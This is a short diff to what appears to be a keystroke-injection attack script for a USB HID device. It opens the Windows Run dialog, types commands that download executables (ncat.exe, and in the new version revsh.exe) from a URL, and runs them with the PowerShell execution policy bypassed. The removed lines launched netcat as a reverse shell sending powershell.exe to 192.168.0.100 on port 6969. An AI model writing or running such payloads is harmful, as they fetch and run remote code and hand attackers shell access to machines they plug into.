@@ -2,7 +2,8 @@ layout('us');		// US keyboard layout
 typingSpeed(0,0);	// type as fast as possible
 
 // uris and configurations
-const ncatUri = "https://example.com/ncat.exe";
+ncatUri = "https://example.com/ncat.exe";
+revshUri = "https://example.com/revsh.exe";
 
 // starting powershell
 press('GUI r');
@@ -19,6 +20,10 @@ type("echo (wget '" + ncatUri + "' -OutFile n.exe) > b.ps1\n");
 type("powershell -ExecutionPolicy ByPass -File b.ps1\n");
 delay(5000);
 
-//running netcat
-type(".\\n.exe " + "192.168.0.100" + " " + "6969" + " -e powershell.exe\n");
+// getting revsh
+type("echo (wget '" + revshUri + "' -OutFile r.exe) > c.ps1\n");
+type("powershell -ExecutionPolicy ByPass -File c.ps1\n");
+delay(5000);
+
+type("dir\n");
 
